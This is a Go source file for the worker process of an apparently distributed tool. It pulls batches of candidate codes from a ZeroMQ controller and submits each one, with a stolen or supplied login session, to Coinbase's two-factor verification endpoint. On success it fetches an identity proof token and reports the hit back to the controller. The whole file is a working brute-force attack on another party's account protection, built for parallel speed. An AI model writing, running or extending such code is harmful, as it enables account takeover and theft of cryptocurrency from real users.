package main

import (
	"context"
	"github.com/google/uuid"
	"github.com/skirkyn/dcw/cmd/common"
	"github.com/skirkyn/dcw/cmd/util"
	"github.com/skirkyn/dcw/cmd/worker/client/zmq"
	"github.com/skirkyn/dcw/cmd/worker/result"
	"github.com/skirkyn/dcw/cmd/worker/runner"
	"github.com/skirkyn/dcw/cmd/worker/sfv"
	"github.com/skirkyn/dcw/cmd/worker/verifier/hr"
	"github.com/skirkyn/dcw/cmd/worker/verifier/hr/cb"
	"github.com/skirkyn/dcw/cmd/worker/verifier/hr/cb/pt"
	"golang.org/x/sync/semaphore"
	"log"
	"net/http"
	"runtime"
	"time"
)

const controllerHost = "CONTROLLER_HOST"
const controllerPort = "CONTROLLER_PORT"
const connAttempts = "CONNECTION_ATTEMPTS"
const connAttemptsTtsSec = "CONNECTION_ATTEMPTS_TTS_SEC"
const batchSize = "WORK_BATCH_SIZE"
const cbLoginSession = "CB_LOGIN_SESSION"

func main() {
	rnr := getRunner()
	wg := rnr.Start()
	wg.Wait()
}
func getRunner() runner.Runner {

	clientConfig := zmq.Config{

		Host:                                 util.GetEnvString(controllerHost, "localhost"),
		Port:                                 util.GetEnvInt(controllerPort, 50000),
		Id:                                   uuid.NewString(),
		MaxConnectAttempts:                   util.GetEnvInt(connAttempts, 1),
		TimeToSleepBetweenConnectionAttempts: time.Duration(util.GetEnvInt(connAttemptsTtsSec, 5)),
	}

	client, err := zmq.NewZMQClient(clientConfig)

	if err != nil {
		log.Fatal("can't create workClient", err)
	}

	runnerConfig := runner.Config{WorkersCount: runtime.NumCPU() * 3}  // for bf & http, a lot of io
	sem := semaphore.NewWeighted(int64(runnerConfig.WorkersCount * 2)) // second batch pulls while the first one is running
	ctx := context.Background()
	workReqTrans := common.NewRequestTransformer[int]()
	workRespTrans := common.NewResponseTransformer[[]string]()

	resultRequestTrans := common.NewRequestTransformer[string]()
	headersSupplier := cb.NewHeadersSupplier(util.GetEnvString(cbLoginSession, ""))
	method := "POST"
	verifyRequestSupplier := hr.NewRequestSupplier[string](method, headersSupplier, "https://login.coinbase.com/api/two-factor/v1/verify", cb.NewBodySupplier())
	proofTokenRequestSupplier := hr.NewRequestSupplier[map[string]string](method, headersSupplier, "https://login.coinbase.com/api/v1/verify-identification", pt.NewBodySupplier())

	successPredicate := cb.NewResponseHandler(http.DefaultClient, proofTokenRequestSupplier)
	verifier := hr.NewVerifier[string](http.DefaultClient, verifyRequestSupplier, successPredicate)
	worker := sfv.NewWorker(sem, ctx, workRespTrans, verifier)
	workReqSupplier := sfv.NewSupplier(util.GetEnvInt(batchSize, 100), workReqTrans, sem, ctx)
	resHandler := result.NewHandler[string](client, resultRequestTrans)

	return runner.NewDefaultRunner[string](runnerConfig, client, worker, workReqSupplier, resHandler)
}
